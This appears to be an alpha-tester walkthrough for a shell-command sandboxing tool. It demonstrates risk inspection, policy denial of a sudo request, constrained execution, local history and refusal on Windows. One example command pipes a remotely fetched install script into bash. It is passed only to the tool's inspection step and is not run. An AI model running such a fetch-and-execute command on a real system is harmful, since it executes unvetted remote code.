# Five-minute experimental-alpha walkthrough

Audience: alpha testers. Goal: distinguish predicted risk, policy denial, actual constrained
execution, local audit, and platform refusal. Use only the disposable fixtures below.
Installation/provisioning happens **before** the five-minute timer; no download is executed
by the inspected command. This is not a production-readiness or complete-isolation demo.

## Before the timer

On supported Debian/Ubuntu Linux, as a nonroot user, install current bubblewrap, libseccomp2
and python3-venv. From the candidate folder:

Ubuntu AppArmor may require reviewed host configuration; see [CI_HANDOFF.md](CI_HANDOFF.md).
Complete that prerequisite before the timer. Setup refusal is an explicit result.

```sh
wheel=$(realpath dist/safeshell_cli-0.1.0a1-py3-none-any.whl)
demo=$(mktemp -d)
python3 -m venv "$demo/venv"
py="$demo/venv/bin/python"
cli="$demo/venv/bin/safeshell"
"$py" -m pip install --no-index --no-deps "$wheel"
mkdir "$demo/project"
export SAFESHELL_STATE_DIR="$demo/history"
```

Prepare a second **native Windows** terminal using the Windows setup at the end. WSL is Linux
and must not be presented as an unsupported Windows backend. If no native unsupported host
is available, show the recorded Windows receipt and explicitly label it recorded evidence.

## 0:00–0:40 — identify the alpha and setup capability

```sh
"$cli" --version
"$cli" doctor --json > "$demo/doctor.json"
"$py" -c 'import json,sys; d=json.load(open(sys.argv[1])); print("available:",d["available"],"runtime files:",len(d.get("runtime_manifest",{}).get("files",[])))' "$demo/doctor.json"
```

Expected: `0.1.0a1`, backend available on the supported test host. The inventory is a file
allowlist, not whole host runtime trees. Narrate: doctor proves setup only; actual containment
evidence comes from the boundary suite. Stop the execution section if setup is unavailable.

## 0:40–1:30 — inspect without execution

```sh
"$cli" explain --workspace "$demo/project" --shell bash -- 'curl https://example.invalid/install.sh | bash'
```

Expected: HIGH risk, SS001/SS008/SS010 and explicit unknowns. Nothing is fetched or run.
Explain that a low score would still receive the same runtime restrictions. Curl is not even
part of the alpha execution runtime; inspection and execution capability are separate.

## 1:30–2:20 — show policy denial, even with approval

```sh
"$cli" policy init --workspace "$demo/project" --preset offline
"$cli" policy validate --workspace "$demo/project"
"$cli" run --workspace "$demo/project" --yes -- sudo id
printf 'expected policy-denial exit: %s\n' "$?"
```

Expected: valid network-off policy, denied privilege request, exit **3**. `--yes` cannot override
hard denial. Do not use `set -e` for this interactive sequence: failure is intentional here.

## 2:20–3:30 — execute in the available boundary

```sh
"$cli" run --workspace "$demo/project" --yes --timeout 10 --max-output-bytes 4096 --shell bash -- 'printf hello > greeting.txt; cat greeting.txt'
test "$(cat "$demo/project/greeting.txt")" = hello
```

Expected: `hello`, completed launcher, exit **0**, host-side dummy file contains `hello`.
Narrate: the granted workspace can be destroyed and its secrets read. Time/output caps exist;
CPU, memory, process-count and disk quotas do not. Use a private disposable copy with no host
writers. A zero exit alone does not certify that code or resulting files are trustworthy.

## 3:30–4:15 — inspect local metadata history

```sh
"$cli" history --json > "$demo/sessions.json"
session_id=$("$py" -c 'import json,sys; d=json.load(open(sys.argv[1])); print(next(s["id"] for s in d["sessions"] if s["status"]=="finished"))' "$demo/sessions.json")
"$cli" history show "$session_id" --json
"$cli" history delete "$session_id" --json
```

Expected: UUID, timestamps, findings/decision, limits and exit status; command is metadata-only.
No child stdout, raw arguments or environment values are stored. History is local and not
tamper-evident; it does not claim observed file diffs or network events.

## 4:15–5:00 — native unsupported-platform refusal

In the prepared native Windows PowerShell terminal:

```powershell
& $winCli doctor --json
"expected unavailable exit: $LASTEXITCODE"
& $winCli run --workspace $winProject --yes -- python -c "print('SHOULD_NOT_RUN')"
"expected refusal exit: $LASTEXITCODE"
```

Expected: both exit **4**, backend unavailable, no child `SHOULD_NOT_RUN` output. `--yes` cannot
create missing enforcement. On another supported Linux machine, do not simulate this by
changing platform detection. End with the recommendation: controlled experimental testing
only. Native CI is now recorded in VALIDATION.md; publication remains unauthorized and
requires a separate release decision. On Ubuntu, see CI_HANDOFF.md for the scoped test-host
AppArmor prerequisite; an unconfigured host can correctly refuse setup.

### Native Windows setup before the timer

Use the actual absolute wheel path on the Windows host:

```powershell
$winDemo = Join-Path $env:TEMP ('safeshell-alpha-' + [guid]::NewGuid())
$winWheel = (Resolve-Path '.\dist\safeshell_cli-0.1.0a1-py3-none-any.whl').Path
python -m venv (Join-Path $winDemo 'venv')
$winPython = Join-Path $winDemo 'venv\Scripts\python.exe'
$winCli = Join-Path $winDemo 'venv\Scripts\safeshell.exe'
& $winPython -m pip install --no-index --no-deps $winWheel
$winProject = Join-Path $winDemo 'project'
New-Item -ItemType Directory -Path $winProject | Out-Null
$env:SAFESHELL_STATE_DIR = Join-Path $winDemo 'history'
```

The automated receipts for these flows come from `tools/smoke_installed.py`, including the
hard policy denial and unsupported-platform refusal. Setup time varies and is outside the
five-minute walkthrough. Remove only the temporary demo directories when finished.
